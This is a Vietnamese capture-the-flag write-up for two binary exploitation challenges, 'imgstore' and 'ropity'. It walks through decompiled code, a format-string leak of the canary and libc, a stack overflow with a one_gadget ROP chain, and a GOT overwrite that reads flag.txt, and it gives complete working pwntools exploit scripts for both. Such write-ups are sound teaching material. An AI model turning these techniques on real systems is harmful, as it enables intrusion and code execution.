---
title: imgstore

---

# imgstore
- Chương trình cho ta 3 file 
```
imgstore
ld-linux-x86-64.so.2 
libc.so.6
```
- Chương trình cho cả libc khả năng cao bài này cần leak libc để chiếm được shell và đọc flag
- Thử chạy chương trình
```
s4ngxg@MSI:~/imag/imgstore$ ./imgstore

[+] Please wait.. The program is starting..

       ______ ______
     _/      Y      \_
    // ~~ ~~ | ~~ ~  \\
   // ~ ~ ~~ | ~~~ ~~ \\
  //________.|.________\\
 `----------'-'----------'

 +=======================+
 |                       |
 |     IMG BOOKSTORE     |
 |                       |
 +=-=-=-=-=-=-=-=-=-=-=-=+
 |                       |
 | [1]. List Books.      |
 | [2]. Buy Book.        |
 | [3]. Sell Book.       |
 | [4]. Exit.            |
 |                       |
 +=======================+

>>
```
- Chương trình cho ta các option nhưng không biết rõ trong các option đó sẽ như thế nào nên IDA để dịch ngược và đọc source 
```
unsigned __int64 sub_208B()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  do
  {
    puts(" +=======================+");
    puts(" |                       |");
    puts(" |     IMG BOOKSTORE     |");
    puts(" |                       |");
    puts(" +=-=-=-=-=-=-=-=-=-=-=-=+");
    puts(" |                       |");
    puts(" | [1]. List Books.      |");
    puts(" | [2]. Buy Book.        |");
    puts(" | [3]. Sell Book.       |");
    puts(" | [4]. Exit.            |");
    puts(" |                       |");
    puts(" +=======================+");
    puts(&s);
    printf(">> ");
    __isoc99_scanf("%1d", &v1);
    getchar();
    if ( v1 == 4 )
    {
      puts(&s);
      printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
      sleep(1u);
      exit(0);
    }
    if ( v1 <= 4 )
    {
      switch ( v1 )
      {
        case 3:
          sub_1E2A();
          continue;
        case 1:
          sub_19D2();
          continue;
        case 2:
          sub_1F9A();
          continue;
      }
    }
    printf("%s[/] Invalid option..%s\n", "\x1B[33m", "\x1B[0m");
    puts(&s);
  }
  while ( v1 != 3 );
  return __readfsqword(0x28u) ^ v2;
}
```
- Các hàm `sub_19D2(), sub_1F9A(), sub_1E2A()` tương ứng với các option của chương trình `List Books, Buy Book, Sell Book`
- Xem cụ thể các hàm 
> #### Hàm List Books
```
unsigned __int64 sub_19D2()
{
  unsigned int v0; // eax
  int i; // [rsp+8h] [rbp-BE8h]
  int j; // [rsp+Ch] [rbp-BE4h]
  char *src[14]; // [rsp+10h] [rbp-BE0h]
  char *v5[14]; // [rsp+80h] [rbp-B70h]
  char v6[2808]; // [rsp+F0h] [rbp-B00h] BYREF
  unsigned __int64 v7; // [rsp+BE8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  src[0] = "Artificial Intelligence: A Modern Approach";
  src[1] = "Superintelligence: Paths, Dangers, Strategies";
  src[2] = "AI Superpowers: China, Silicon Valley, and the New World Order";
  src[3] = "The Singularity Is Near: When Humans Transcend Biology";
  src[4] = "AI Ethics";
  src[5] = "The Fourth Age: Smart Robots, Conscious Computers, and the Future of Humanity";
  src[6] = "I Am A Strange Loop";
  src[7] = "Machines Like Me";
  src[8] = "Heartificial Intelligence: Embracing Our Humanity to Maximize Machines";
  src[9] = "Life's Ratchet: How Molecular Machines Extract Order from Chaos";
  src[10] = "The Sentient Machine: The Coming Age of Artificial Intelligence";
  src[11] = "Robot-Proof: Higher Education in the Age of Artificial Intelligence";
  src[12] = "AIQ: How People and Machines Are Smarter Together";
  src[13] = "Thinking Machines: The Quest for Artificial Intelligence and Where It's Taking Us Next";
  v5[0] = "Stuart Russell, Peter Norvig";
  v5[1] = "Nick Bostrom";
  v5[2] = "Kai-Fu Lee";
  v5[3] = "Ray Kurzweil";
  v5[4] = "Wendell Wallach, Colin Allen";
  v5[5] = "Byron Reese";
  v5[6] = "Douglas Hofstadter";
  v5[7] = "Ian McEwan";
  v5[8] = "John C. Havens";
  v5[9] = "Peter M. Hoffmann";
  v5[10] = "Amir Husain";
  v5[11] = "Joseph E. Aoun";
  v5[12] = "Nick Polson, James Scott";
  v5[13] = "Luke Dormehl";
  for ( i = 0; i <= 13; ++i )
  {
    strcpy(&v6[200 * i], src[i]);
    strcpy(&v6[200 * i + 100], v5[i]);
  }
  v0 = time(0LL);
  srand(v0);
  sub_13D8(v6, 14LL);
  puts(&s);
  printf("%s[LIST OF BOOKS]:%s\n", "\x1B[36m", "\x1B[0m");
  puts(&s);
  for ( j = 0; j <= 13; ++j )
    printf("[+] %s by %s\n", &v6[200 * j], &v6[200 * j + 100]);
  puts(&s);
  printf("%s[>] Press enter to return to menu..%s\n", "\x1B[33m", "\x1B[0m");
  getchar();
  puts(&s);
  return __readfsqword(0x28u) ^ v7;
}
```
- Xem qua thì không có buff nào

> #### Hàm Buy Book 
```
unsigned __int64 sub_1F9A()
{
  char v1; // [rsp+Fh] [rbp-71h] BYREF
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_187F();
  printf(
    "%sSorry, there are no books to buy at this time, but you can request a book if you want.%s\n",
    "\x1B[34m",
    "\x1B[0m");
  printf("Want to request a book?? ");
  printf("[y/n]: ");
  __isoc99_scanf("%1c", &v1);
  getchar();
  if ( v1 == 'y' )
  {
    printf("Enter book title: ");
    fgets(s, 50, stdin);
    puts("Ok! Thankyou! Our research team shall considered that book.");
  }
  else
  {
    puts("Alright then..");
    puts(&::s);
  }
  return __readfsqword(0x28u) ^ v3;
}
```
- Hàm này cũng không có buff 
> #### Sell Book
```
unsigned __int64 sub_1E2A()
{
  char v1; // [rsp+7h] [rbp-59h] BYREF
  int buf; // [rsp+8h] [rbp-58h] BYREF
  int fd; // [rsp+Ch] [rbp-54h]
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  close(fd);
  buf = (unsigned __int16)buf;
  do
  {
    printf("Enter book title: ");
    fgets(s, 50, stdin);
    printf("Book title --> ");
    printf(s);
    puts(&::s);
    if ( 334873123 * buf == dword_6050 )
    {
      dword_608C = 2;
      sub_1D77(2);
    }
    puts("Sorry, we already have the same title as yours in our database; give me another book title.");
    printf("Still interested in selling your book? [y/n]: ");
    __isoc99_scanf("%1c", &v1);
    getchar();
  }
  while ( v1 == 'y' );
  puts(&::s);
  printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
  sleep(1u);
  return __readfsqword(0x28u) ^ v5;
}
```
- Hàm này ta thấy có một lỗi `Format string` tại `printf(s)`
- Ta thấy có một hàm bên trong đó là `sub_1D77(2);`, xem hàm này có gì
```
unsigned __int64 __fastcall sub_1D77(int a1)
{
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_18F2();
  if ( a1 == 2 )
  {
    printf("%s[/] UNDER DEVELOPMENT %s\n", "\x1B[44m", "\x1B[0m");
    putchar('>');
    fgets(s, 160, stdin);
  }
  else
  {
    printf("%s[!] SECURITY BREACH DETECTED%s\n", "\x1B[41m", "\x1B[0m");
    puts("[+] BAD HACKER!!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
- Ta lại thấy thêm một lỗi `Buffer overflow` khi mảng `s` chỉ khai báo 104 byte nhưng lại cho phép nhập vào 160 byte
- Có thể khai thác các lỗi này để leak libc và chiếm shell
- Kiểm tra các biện pháp bảo vệ
```
pwndbg> checksec
[*] '/home/s4ngxg/imag/imgstore/imgstore'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
- Tất cả biện pháp bảo vệ đều bật nhưng để khai thác lỗi `buffer overflow` thì cần bypass qua `canary`
- Debug để xem lỗi `format string` có thể leak được gì, nhập một chuỗi nhiều `%p`
![image](https://hackmd.io/_uploads/BJ0X07ghR.png)
- Ta thấy từ `%p` thứ 6 trở đi thì đã leak được dữ liệu trong stack
- Vậy ta có thể leak được giá trị `canary` để có thể bypass và khai thác lỗi `buffer overflow`
- Xem ofset tới địa chỉ `canary`
![image](https://hackmd.io/_uploads/HJR6RXg2R.png)
- Ta thấy giá trị `canary` là giá trị nằm trước `rbp`, vậy cần `%p` thứ 17 -> `%17$p`
- Để khai thác được `buffer overflow` cần thực thi hàm `sub_1D77(2);` trong 
```
if ( 334873123 * buf == dword_6050 )
    {
      dword_608C = 2;
      sub_1D77(2);
    }
```
- Biến `buf` được lấy random 4 byte và để thự thi hàm đó thì phải bằng một giá trị nào đó cho trước 
![image](https://hackmd.io/_uploads/B1eA-Vxh0.png)
- Ta thấy biến `buf` được lấy từ địa chỉ `rbp - 0x58` và giá trị để `buf * 0x13f5c223` bằng giá trị đó nằm ở địa chỉ `0x55555555a050`
```
pwndbg> x/gx 0x55555555a050
0x55555555a050: 0x00000000feedbeef
```
- Giá trị đó là `0x00000000feedbeef`
![image](https://hackmd.io/_uploads/rkqpMVl20.png)
- Ta thấy `rbp - 0x58` là có giá trị là `0x81f0` vì chỉ lấy 4 byte
`0x81f0 * 0x13f5c223 != 0x00000000feedbeef`
- Vậy ta phải cần đổi giá trị `buf` hoặc giá trị có sẵn để có thể thực thi thông qua lỗi `format string`
- Nhưng không thể đổi giá trị `buf` vì `0xfeedbeef % 0x13f5c223 != 0` vậy bắt buộc phải đổi giá trị kia
- Nhưng giá trị đó không nằm trong stack nên ta cần đưa địa chỉ của giá trị đó là `0x55555555a050` vào stack để có thể thay đổi giá trị, ta thấy dữ liệu đưa vào nằm ở `rbp - 0x50` là thứ hạng thứ 8 khu format string --> `%8$n`
- Vì PIE được bật nên địa chỉ không cố định nên ta cần leak được địa chỉ của giá `0xfeedbeef`, cuối cùng là leak biến `buf`
![image](https://hackmd.io/_uploads/B1EmKEl2R.png)
- Thấy được đầu stack có giá trị `0x55555555a060` có ofset với địa chỉ của `0xfeedbeef` là `0x10` nên ta leak được giá trị đầu stack trừ 0x10 
![image](https://hackmd.io/_uploads/SyhqpVx3A.png)
- Ta đã leak được các giá trị cần thiết 
- Sau đó dùng `%c` và `%n` để đổi giá trị 
![image](https://hackmd.io/_uploads/Hkw5xSl3R.png)
- Ta thấy trên stack có địa chỉ của một lệnh trong libc nằm ở `rbp + 0x38` để có địa chỉ libc ta cần tìm ofset này với địa chỉ cơ sở của libc khi ta leak địa chỉ này trừ cho ofset là ra địa chỉ cơ sở libc
![image](https://hackmd.io/_uploads/SkogbSlhA.png)
- Địa chỉ cơ sở tạm thời của libc tại `0x7ffff7dd5000`
> 0x7ffff7df9083 - 0x7ffff7dd5000 = 0x24083
- Sau có địa chỉ libc thì có cả canary tiến hành chiếm shell code
## Script
```python
#!/usr/bin/python3

from pwn import *

context.arch = "amd64"
context.endian = "little"

exe = ELF('./imgstore', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

p = process(exe.path)
#p = remote("imgstore.chal.imaginaryctf.org", 1337, ssl=False)
input()
p.sendlineafter(b'>> ', b'3')

payload = b'%6$p.%7$p.%17$p.%25$p'


p.sendlineafter(b'Enter book title:', payload)

p.recvuntil(b'Book title --> ')
p.recv(2)
add = int(p.recv(12), 16)
add = add - 0x10
p.recv(3)
buf = int(p.recv(9), 16) & 0xFFFF
p.recv(3)
canary =  int(p.recv(16), 16) 
p.recv(3)
libc_address = int(p.recv(12), 16) - 0x24083


val_new = (buf*0x13f5c223) & 0xffffffff

log.info(hex(add))
log.info(hex(buf))
log.info(hex(canary))
log.info(hex(libc_address))


p.sendlineafter(b'Still interested in selling your book? [y/n]: ', b'y')


payload = fmtstr_payload(offset = 8, writes = {add:val_new}, write_size="short")

#input()
p.sendlineafter(b'Enter book title: ', payload)

#pop_rdi = 0x0000000000023b6a

pop_r12 = 0x000000000002f709 + libc_address
one_gadget = 0xe3afe + libc_address
payload = flat(
    b'A'*104,
    canary,
    b'A'*8,
    pop_r12, 0,
    one_gadget
)
input()
p.sendlineafter(b'>', payload)

#input()

p.interactive()

```
# ropity
- Chương trình cho ta một file nhị phân 
- Kiểm tra biện pháp bảo vệ
```
[*] '/home/s4ngxg/imag/ropity/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
- dùng IDA để dịch ngược
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[8]; // [rsp+8h] [rbp-8h] BYREF
  return (unsigned int)fgets(s, 256, _bss_start);
}
``` 
- Chỉ là cho nhập vào 256 byte, thấy ngay lỗi `buffer overflow`
- Bên cạnh đó còn có hàm `printfile`
```
signed __int64 __fastcall printfile(const char *a1, __int64 a2, int a3)
{
  int v3; // esi
  size_t v4; // r10
  v3 = sys_open(a1, 0, a3);
  return sys_sendfile(1, v3, 0LL, v4);
}
```
- Hàm này dùng để mở một tệp và in ra màn hình 
- Nếu ta có thể thay đổi thanh ghi trước khi hàm `sys_open` thành địa chỉ chứa `flag.txt` thì ta có thể đọc flag
```
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401136 <+0>:     endbr64
   0x000000000040113a <+4>:     push   rbp
   0x000000000040113b <+5>:     mov    rbp,rsp
   0x000000000040113e <+8>:     sub    rsp,0x10
   0x0000000000401142 <+12>:    mov    rdx,QWORD PTR [rip+0x2ee7]        # 0x404030 <stdin@GLIBC_2.2.5>
   0x0000000000401149 <+19>:    lea    rax,[rbp-0x8]
   0x000000000040114d <+23>:    mov    esi,0x100
   0x0000000000401152 <+28>:    mov    rdi,rax
   0x0000000000401155 <+31>:    call   0x401040 <fgets@plt>
=> 0x000000000040115a <+36>:    nop
   0x000000000040115b <+37>:    leave
   0x000000000040115c <+38>:    ret
End of assembler dump.
pwndbg> disass printfile
Dump of assembler code for function printfile:
   0x000000000040115d <+0>:     endbr64
   0x0000000000401161 <+4>:     push   rbp
   0x0000000000401162 <+5>:     mov    rbp,rsp
   0x0000000000401165 <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000401169 <+12>:    mov    rax,0x2
   0x0000000000401170 <+19>:    mov    rsi,0x0
   0x0000000000401177 <+26>:    syscall
   0x0000000000401179 <+28>:    mov    rsi,rax
   0x000000000040117c <+31>:    mov    rdi,0x1
   0x0000000000401183 <+38>:    mov    rdx,0x0
   0x000000000040118a <+45>:    mov    r8,0x100
   0x0000000000401191 <+52>:    mov    rax,0x28
   0x0000000000401198 <+59>:    syscall
   0x000000000040119a <+61>:    nop
   0x000000000040119b <+62>:    pop    rbp
   0x000000000040119c <+63>:    ret
```
- để đưa chuỗi `flag.txt` ta chỉ có thể nhập qua qua `fgets` nhưng khi đó chuỗi `flag.txt` nằm trên stack và ta không thể biết được địa chỉ chính xác của nó 
- Ta cần đưa chuỗi `flag.txt` vào một địa chỉ cố định
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/s4ngxg/imag/ropity/vuln
          0x401000           0x402000 r-xp     1000   1000 /home/s4ngxg/imag/ropity/vuln
          0x402000           0x403000 r--p     1000   2000 /home/s4ngxg/imag/ropity/vuln
          0x403000           0x404000 r--p     1000   2000 /home/s4ngxg/imag/ropity/vuln
          0x404000           0x405000 rw-p     1000   3000 /home/s4ngxg/imag/ropity/vuln
          0x405000           0x426000 rw-p    21000      0 [heap]
    0x7ffff7d83000     0x7ffff7d86000 rw-p     3000      0 [anon_7ffff7d83]
    0x7ffff7d86000     0x7ffff7dae000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dae000     0x7ffff7f43000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f43000     0x7ffff7f9b000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9b000     0x7ffff7f9c000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9c000     0x7ffff7fa0000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa0000     0x7ffff7fa2000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7fa2000     0x7ffff7faf000 rw-p     d000      0 [anon_7ffff7fa2]
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```
- Ta thấy địa chỉ cho phép ghi là từ `0x404000` đến `0x405000` 
```
   0x0000000000401149 <+19>:    lea    rax,[rbp-0x8]
   0x000000000040114d <+23>:    mov    esi,0x100
   0x0000000000401152 <+28>:    mov    rdi,rax
   0x0000000000401155 <+31>:    call   0x401040 <fgets@plt>
```
- Mà ta thấy `rdi` được lấy từ `rbp-0x8` nên ta cần thay đổi `rbp`
- Để thay đổi `rbp` cần gadget `pop rbp`, ta có một gadget hữu ích
`0x000000000040111d: pop rbp; ret;`
- Vậy thực thi `fgets` 2 lần, lần đầu để thay đổi `rbp` và lần sau đưa chuỗi `flag.txt` vào
- Nhưng chương trình hoạt động không đúng vì sau khi thực thi `fgets` lần 2 thì thanh ghi `rdi` không còn giữ địa chỉ của flag nữa để có được tham số như mong muốn khi vào hàm `printfile`
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/s4ngxg/imag/ropity/vuln:
GOT protection: Partial RELRO | Found 1 GOT entries passing the filter
[0x404018] fgets@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
```
- Đổi giá trị plt của `fgets` thành địa chỉ của hàm `printfile`
- Vậy ta cần thực thi `fgets` 3 lần 
- Ở lần nhập thứ nhất đặt `rbp` bằng `fgets.got + 8` để set `rdi` bằng `fgets.got` và sau đó quay lại hàm `fgets`
- Ở lần nhập thứ 2 nhập địa chỉ của `printfile` để `fgets.got` trỏ đến địa chỉ `printfile` và cần set `rbp` và nhập chuỗi `flag.txt`

## Script
```python=
#!/usr/bin/python3

from pwn import *

p = process('./vuln')

pop_rbp = 0x000000000040111d
return_fgets = 0x0000000000401142
printfile = 0x000000000040115d
fgets_got = 0x404018

payload = b'A'*16
payload += p64(pop_rbp)
payload += p64(fgets_got + 8)
payload += p64(return_fgets)

input()
p.sendline(payload)

payload = p64(printfile)
payload += b'A'*8
payload += p64(pop_rbp)
payload += p64(fgets_got + 0x30)
payload += p64(return_fgets)
payload += b'flag.txt'
payload += p64(0)

p.sendline(payload)

p.interactive()
```
# onewrite
